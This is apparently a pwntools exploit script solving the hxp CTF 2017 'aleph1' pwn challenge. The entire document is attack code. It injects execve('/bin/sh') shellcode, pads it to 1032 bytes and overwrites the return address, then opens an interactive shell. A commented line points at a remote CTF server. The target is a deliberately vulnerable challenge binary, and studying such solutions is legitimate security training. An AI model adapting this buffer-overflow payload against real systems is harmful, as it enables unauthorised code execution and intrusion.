#usr/bin/python

#Faid Mohammed Amine
#Fb : piratuer

# Hxp CTF 2017 - Pwn 50 - aleph1

from pwn import *



#s = remote("35.205.206.137", 1996)
s = process('./vuln')

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
patt = "A"*(1032-len(shellcode))
address = p64(0x00602010)


payload = shellcode + patt + address

s.sendline(payload)
s.interactive()
